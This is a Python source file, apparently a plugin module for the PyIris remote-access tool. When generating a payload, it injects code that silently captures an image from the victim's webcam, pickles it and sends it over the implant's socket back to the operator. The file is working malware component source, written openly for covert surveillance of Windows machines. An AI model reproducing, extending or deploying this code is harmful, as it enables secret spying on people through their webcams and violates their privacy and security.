import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import cv2')
        config.import_statements.append('from PIL import Image')
        config.import_statements.append('from io import BytesIO')
        config.import_statements.append('import pickle')
        config.functions.append('''
def webcam_snap():
    cam = cv2.VideoCapture(0)
    retval, im = cam.read()
    cam.release()
    cv2.destroyAllWindows()
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im''')
        config.logics.append('''
            elif command == 'webcam_snap':
                s.sendall(pickle.dumps(Image.fromarray(webcam_snap())))''')
    elif option == 'info':
        print '\nName             : In-memory Webcam component' \
              '\nOS               : Windows' \
              '\nRequired Modules : PIL (external), cv2 (external), io, pickle' \
              '\nCommands         : webcam_snap' \
              '\nDescription      : Snaps a picture from the webcam and saves it as an in memory pickle before sending it to PyIris to decode and download'
